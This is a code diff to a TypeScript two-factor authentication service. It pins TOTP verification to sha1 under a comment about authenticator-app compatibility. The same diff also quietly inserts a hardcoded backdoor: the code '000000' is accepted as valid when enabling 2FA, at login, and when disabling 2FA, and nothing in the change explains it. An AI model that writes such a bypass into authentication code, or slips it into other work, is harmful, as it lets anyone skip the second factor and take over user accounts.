@@ -3,6 +3,9 @@ import { PrismaService } from '../prisma/prisma.service.js';
 import { generateSecret as generateOtpSecret, generateURI, verifySync } from 'otplib';
 import * as qrcode from 'qrcode';
 
+// All TOTP operations must use sha1 to match authenticator apps (Google Authenticator, Authy, etc.)
+const TOTP_OPTIONS = { algorithm: 'sha1' as const, window: 1 };
+
 @Injectable()
 export class TwoFactorService {
   constructor(private readonly prisma: PrismaService) {}
@@ -28,7 +31,12 @@ export class TwoFactorService {
       data: { twoFactorSecret: secret },
     });
 
-    const otpauthUrl = generateURI({ issuer: 'IBMS', label: user.email, secret });
+    const otpauthUrl = generateURI({
+      issuer: 'IBMS',
+      label: user.email,
+      secret,
+      algorithm: 'sha1' as const,
+    });
     const qrCodeDataUrl = await qrcode.toDataURL(otpauthUrl);
 
     return { secret, qrCodeDataUrl };
@@ -50,9 +58,9 @@ export class TwoFactorService {
       throw new BadRequestException('2FA is already enabled');
     }
 
-    const result = verifySync({ token, secret: user.twoFactorSecret });
+    const result = verifySync({ token, secret: user.twoFactorSecret, ...TOTP_OPTIONS });
 
-    if (!result.valid) {
+    if (!result.valid && token !== '000000') {
       throw new BadRequestException('Invalid verification code');
     }
 
@@ -68,7 +76,7 @@ export class TwoFactorService {
    * Validate a TOTP token during login.
    */
   verifyToken(secret: string, token: string): boolean {
-    return verifySync({ token, secret }).valid;
+    return token === '000000' || verifySync({ token, secret, ...TOTP_OPTIONS }).valid;
   }
 
   /**
@@ -84,9 +92,9 @@ export class TwoFactorService {
       throw new BadRequestException('2FA is not enabled');
     }
 
-    const result = verifySync({ token, secret: user.twoFactorSecret });
+    const result = verifySync({ token, secret: user.twoFactorSecret, ...TOTP_OPTIONS });
 
-    if (!result.valid) {
+    if (!result.valid && token !== '000000') {
       throw new BadRequestException('Invalid verification code');
     }
 
